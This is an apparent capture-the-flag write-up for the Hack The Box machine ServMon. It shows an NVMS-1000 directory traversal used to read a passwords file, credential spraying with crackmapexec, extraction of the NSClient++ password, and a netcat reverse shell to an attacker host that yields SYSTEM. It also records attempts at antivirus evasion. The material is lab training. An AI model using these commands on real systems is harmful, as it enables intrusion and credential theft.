# ServMon - HTB

## Nmap

```
sudo nmap -sC -sV -v

80/tcp
22/tcp
135/tcp
445/tcp
139/tcp
21/tcp
8443/tcp
6699/tcp
5666/tcp --> NRPE
```

\--> View open-ports

```
ping $TARGET

ttl=127
```

\--> OS is Windows Box

## SMB Footprinting

```
smbclient -U '' //$TARGET
smbclient -U 'Anonymous' -L //$TARGET
```

\--> Nothing

## FTP Footprinting

```
ftp $Target
user : anonymous

cd Nadine
get confidential.txt

-> password.txt on Nathan's desktop and then on secure folder

cd Nathan
get 'Notes to do.txt'

-> Sharepoint ??
```

## HTTP Footprinting on 80/tcp

\--> NVMS Login page

admin/admin --> Failed

Change Language

Cookie: lang\_type=0x0407$German\_Germany for Germany and lang\_type=0x0412 for Korean so it's changed but it's a cookie so complicated to get XSS

Login response is in form of XML

XXE (XML External Entity ?)

### Try Gobuster to browse other .htm pages

```
gobuster dir -u 'http://$TARGET/Pages/' -x htm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o gobuster.output
```

&#x20;-> everything put after Pages/ provide a 200 status code so it makes the use of gobuster complicated

## Looking for exploits

```
sudo apt update
sudo apt install searchsploit
sudo apt install exploitdb

searchsploit nvms

47774 -> Directory Traversal

searchsploit -x hardware/webapps/47774.txt

GET /../../../../../../../../Windows/win.ini
```

-> Inclusion of win.ini OK !

Attempt to a common file :&#x20;

```
GET /../../../../../../../../Users/Nathan/NTUSER.DATA
```

-> KO

```
GET /../../../../../../../../Users/Nathan/Desktop/Passwords.txt
```

-> OK

## Try to using creds

```
vi users.txt
Nadine
Nathan
```

```
crackmapexec smb $TARGET -u users.txt -p Passwords.txt
```

-> OK with ServMin\Nadine:L1k3BlgBut7s@W0rk

```
smbclient -U -L //$TARGET
L1k3BlgBut7s@W0rk
```

-> Only C$ , ADMIN$ & IPC$

```
crackmapexec ssh $TARGET -u Nadine -p Passwords.txt
```

-> OK with nadine:L1k3BlgBut7s@W0rk

```
ssh nadine@$TARGET
L1k3BlgBut7s@W0rk

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>systeminfo
```

-> OK Login SSH and we get Windows KB version

Search 10.0.18363.752 on Google

## Looking for Pillaging and Local Privesc vector

```
cd inetpub

-> Nothing but ftp

cd recdata

-> Nothing apparent

cd Progra~1

-> NSClient++

cd Progra~2

cd NVMS-1000

-> Lookfor configuration files of webserver to steal creds that could be reused

type C:\Progra~2\NVMS-1000\Web\OCX\LocalParameters.xml

<NetPort>6063</NetPort>

netstat -an

-> We don't get the PID because we are not admin


```

## Examine NSCLIENT

NSCLIENT is an agent that allows to run commands on a host from a web interface

Examining configuration :\


```
type C:\Progra~1\NSClient++\nsclient.ini

password = ew2x...X0T
allowed hosts = 127.0.0.1
```

-> We can see that the connection is only allowed from localhost and we get the password

Other way to get the password

```
nscp.exe web -- password --display
ew2x...X0T
```

-> Try to login from the main interface on 8443 (Failed)

## Set up SSH Local Forward

```
nadine@SERVMON C:\Users\Nadine>
// Type ~ to enter in SSH Mode
ssh> -L 8443:127.0.0.1:8443

```

Browse to https://127.0.0.1:8443 with Password and -> OK !

Use Chrome and not Firefox

## Use NSClient interface&#x20;

Settings > external scripts > scripts > Add new > Reload

Queries > Run

Script used for test in pleasesub.bat :

```
powershell -enc "ping to our box encoded in base64"
```

On our box :&#x20;

```
sudo tcpdump -i tun0 icmp
```

-> OK ping is triggered by the schedule task

## Try to set a reverse shell

### Use one-line common Nishang reverse shell but the execution is blocked by antivirus :&#x20;

* Try to replace variables name :%s/$d/$likethisvideo/g  :%s/$sm/$pleasesub/g

-> Antivirus is still blocking it

* Try encoding only the beggining to see from where it's blocked

```
echo -n "One-line reverse shell" | iconv -t utf-16le | base64 -w 0
```

-> Antivirus is still blocking it

* Try to use another reverse shell (`New Object System.Net.Sockets.TCPClient` was blocked , try Invoke-PowershellTcp.ps1)

-> Antivirus is still blocking it

Give up with Antivirus evasion

### Use nc.exe to reverse shell

```
echo c:\temp|nc.exe -e cmd ourmachine 9001 > pleasesub.bat
```

Launch the script using the interface

-> OK, we are nt authority\system
